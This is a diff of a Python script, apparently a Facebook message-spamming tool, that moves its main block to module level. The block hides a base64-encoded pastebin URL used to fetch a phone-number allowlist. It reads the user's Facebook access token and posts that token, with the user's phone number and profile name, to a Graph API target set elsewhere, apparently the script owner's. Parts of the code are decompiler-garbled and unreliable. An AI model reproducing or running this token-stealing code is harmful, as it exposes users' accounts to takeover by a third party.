@@ -224,44 +224,43 @@ def get_posts():
                         del e
 		
 		
-	qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3liakNnZjVm"
-	www = base64.b64decode(qqq)
-	eee = www.decode("utf-8")
-	rrr = requests.get(eee)
-	for linee in rrr:
-		mmm = linee.decode("utf-8")
-		mmm = mmm.split(',')
-		print('')
-	inn = input(BOLD + CYAN + '[+] Mobile Number :: ')
-	if inn in mmm:
-	    token = input('[+] Token File :: ')
-	    with open(token, 'r') as f2:
-		access_token = f2.read()
-		payload = {
-		    'access_token': access_token }
-		a = 'https://graph.facebook.com/v14.0/me'
-		b = requests.get(a, payload, **('params',))
-		d = json.loads(b.text)
-		if 'name' not in d:
-		    print(BOLD + RED + '\n[x] Token Invalid ..!!')
-		    sys.exit()
-		f = d['name']
-		prof = '\nYour Profile ' + f + ' Is Ready \n\n'
-		profile_id = input(BOLD + CYAN + '[+] Conservation ID :: ')
-		xxx = input(BOLD + CYAN + '[+] Add Name Kidx :: ')
-		ms = input(BOLD + CYAN + '[+] Add Text File :: ')
-		repeat = int(input(BOLD + CYAN + '[+] File Repeat :: '))
-		timm = int(input(BOLD + CYAN + '[+] Speed in Seconds :: '))
-		load = '\n________All Done....Loading Profile Info.....!\n'
-		url1 = 'https://graph.facebook.com/v14.0/{0}/'.format(r)
-		parameters = {
-		    'access_token': access_token,
-		    'message': 'Phone No : ' + inn + '\nProfile Name : ' + f + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/t_' + profile_id }
-		s = requests.post(url1, parameters, headers, **('data', 'headers'))
-		prof = '[+]=> Active Profile :: ' + f + '\n\n'
-		ns = open(ms, 'r').readlines()
-		[ 0.001 for pro in prof ]==(None, None, None)
-	    if not None:
-		pass
-    return None
+qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3liakNnZjVm"
+www = base64.b64decode(qqq)
+eee = www.decode("utf-8")
+rrr = requests.get(eee)
+for linee in rrr:
+	mmm = linee.decode("utf-8")
+	mmm = mmm.split(',')
+	print('')
+inn = input(BOLD + CYAN + '[+] Mobile Number :: ')
+if inn in mmm:
+    token = input('[+] Token File :: ')
+    with open(token, 'r') as f2:
+	access_token = f2.read()
+	payload = {
+	    'access_token': access_token }
+	a = 'https://graph.facebook.com/v14.0/me'
+	b = requests.get(a, payload, **('params',))
+	d = json.loads(b.text)
+	if 'name' not in d:
+	    print(BOLD + RED + '\n[x] Token Invalid ..!!')
+	    sys.exit()
+	f = d['name']
+	prof = '\nYour Profile ' + f + ' Is Ready \n\n'
+	profile_id = input(BOLD + CYAN + '[+] Conservation ID :: ')
+	xxx = input(BOLD + CYAN + '[+] Add Name Kidx :: ')
+	ms = input(BOLD + CYAN + '[+] Add Text File :: ')
+	repeat = int(input(BOLD + CYAN + '[+] File Repeat :: '))
+	timm = int(input(BOLD + CYAN + '[+] Speed in Seconds :: '))
+	load = '\n________All Done....Loading Profile Info.....!\n'
+	url1 = 'https://graph.facebook.com/v14.0/{0}/'.format(r)
+	parameters = {
+	    'access_token': access_token,
+	    'message': 'Phone No : ' + inn + '\nProfile Name : ' + f + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/t_' + profile_id }
+	s = requests.post(url1, parameters, headers, **('data', 'headers'))
+	prof = '[+]=> Active Profile :: ' + f + '\n\n'
+	ns = open(ms, 'r').readlines()
+	[ 0.001 for pro in prof ]==(None, None, None)
+    if not None:
+	pass
 print(BOLD + RED + '[-] <==> Your Number Is Wrong Please Take Approval From Owner')
